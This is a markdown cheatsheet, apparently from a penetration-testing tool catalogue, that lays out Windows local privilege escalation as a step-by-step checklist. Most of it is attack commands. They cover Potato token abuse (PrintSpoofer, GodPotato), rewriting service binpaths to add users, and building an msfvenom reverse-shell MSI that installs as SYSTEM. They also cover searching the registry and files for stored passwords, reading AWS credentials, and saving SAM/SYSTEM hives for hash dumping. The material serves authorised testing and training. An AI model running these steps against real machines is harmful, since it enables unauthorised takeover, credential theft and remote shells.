---
name: Windows PrivEsc Checklist
category: Cheatsheets & Playbooks
description: Manual local privilege escalation checks for Windows — services, tokens, creds.
tags: [privesc, windows, seimpersonate, services, uac, tokens, oscp]
---

# Windows PrivEsc Checklist

A manual checklist for escalating from a low-privilege Windows user to SYSTEM/Administrator. Run [winPEAS](#/tool/peass) for the automated pass; use this to understand and act on what it flags.

> Commands are `cmd`/PowerShell. Work top to bottom; token privileges and service misconfigs pay off most often.

## Quick context

```cmd
whoami /all                     :: user, groups, and PRIVILEGES (key)
whoami /priv
systeminfo                       :: OS build/patch level (for kernel exploits)
hostname & ipconfig /all
net user & net localgroup administrators
cmdkey /list                     :: stored credentials
```

## Token privileges (fast win on servers)

`whoami /priv` — look for these enabled:

```text
SeImpersonatePrivilege / SeAssignPrimaryToken  -> Potato attacks -> SYSTEM
SeBackupPrivilege        -> read any file (SAM/SYSTEM hives)
SeRestorePrivilege       -> write any file
SeDebugPrivilege         -> dump LSASS / inject
SeTakeOwnershipPrivilege -> own any object
```

SeImpersonate (typical on IIS/MSSQL service accounts):

```cmd
:: PrintSpoofer / GodPotato / JuicyPotatoNG
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"
```

## Service misconfigurations

```cmd
:: Unquoted service paths with spaces
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
:: Weak service permissions (can you reconfigure/restart it?)
accesschk.exe -uwcqv "Everyone" *          :: (Sysinternals)
accesschk.exe -uwcqv "Authenticated Users" *
sc qc <service>
```

Exploit paths: writable service binary → replace it; `SERVICE_CHANGE_CONFIG` → `sc config svc binpath= "cmd /c net user..."`; unquoted path → drop a binary in a parent folder.

## AlwaysInstallElevated

```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: if BOTH are 0x1 -> any MSI runs as SYSTEM:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o s.msi
msiexec /quiet /qn /i s.msi
```

## Stored credentials & files

```cmd
cmdkey /list                                        :: saved creds -> runas /savecred
reg query HKLM /f password /t REG_SZ /s             :: registry passwords
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"   :: autologon
dir /s /b *.kdbx *.config web.config unattend.xml 2>nul
findstr /si password *.xml *.ini *.txt *.config 2>nul
:: Cloud/creds
type %USERPROFILE%\.aws\credentials 2>nul
```

PowerShell equivalents:

```powershell
Get-ChildItem -Recurse -Include *.config,*.xml,unattend.xml -ErrorAction SilentlyContinue | Select-String -Pattern password
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | fl DefaultUserName,DefaultPassword
```

## Scheduled tasks & startup

```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName Run As"
:: writable task binary or script that runs as a higher user -> replace it
icacls "C:\path\to\task.exe"
```

## Patch level / kernel exploits (last resort)

```cmd
systeminfo > si.txt
:: feed to Watson / wesng / windows-exploit-suggester
wes.py si.txt
```

## After you get creds/SYSTEM

```cmd
:: dump hashes with SYSTEM
reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM system.hive
:: then offline: impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

> Priority that usually works: `whoami /priv` (SeImpersonate → Potato) → service misconfigs → AlwaysInstallElevated → stored creds → scheduled tasks → kernel exploit. Automate with [winPEAS](#/tool/peass); dump/reuse creds with [mimikatz](#/tool/mimikatz) and [impacket](#/tool/impacket). Companion: [Linux PrivEsc](#/tool/privesc-linux).
